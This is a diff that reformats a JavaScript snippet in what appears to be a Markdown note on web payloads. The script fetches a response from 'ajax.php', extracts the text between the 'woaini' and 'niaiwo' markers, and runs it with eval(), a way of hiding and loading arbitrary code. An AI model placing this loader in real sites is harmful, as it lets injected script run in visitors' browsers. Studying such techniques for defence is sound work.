@@ -138,23 +138,28 @@ eval(document.boby.innerHTML.substring(document.boby.innerHTML.indexOf('woaini')
     <boby>
         <script>
             var xmlhttp;
-var request_text;
-if(window.XMLHttpRequest){
-xmlhttp = new XMLHttpRequest();
-}else{
-xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-}
-xmlhttp.onreadystatechange=function(){
-if(xmlhttp.readyState==4 &&xmlhttp.status==200){
-request_text=xmlhttp.responseText;
-var text = request_text.match(/woaini(.*)niaiwo/i);
-eval(text[1]);
-}
-}
-xmlhttp.open("POST","ajax.php","true");
-xmlhttp.send();
-</script>
-</boby>
+            var request_text;
+            if(window.XMLHttpRequest)
+            {
+                xmlhttp = new XMLHttpRequest();
+            }
+            else
+            {
+                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+            xmlhttp.onreadystatechange=function()
+                                       {
+                         if(xmlhttp.readyState==4 &&xmlhttp.status==200)
+                         {
+                             request_text=xmlhttp.responseText;
+                             var text = request_text.match(/woaini(.*)niaiwo/i);
+                             eval(text[1]);
+                         }
+                                       }
+            xmlhttp.open("POST","ajax.php","true");
+            xmlhttp.send();
+        </script>
+    </boby>
 </html>
 ```
 
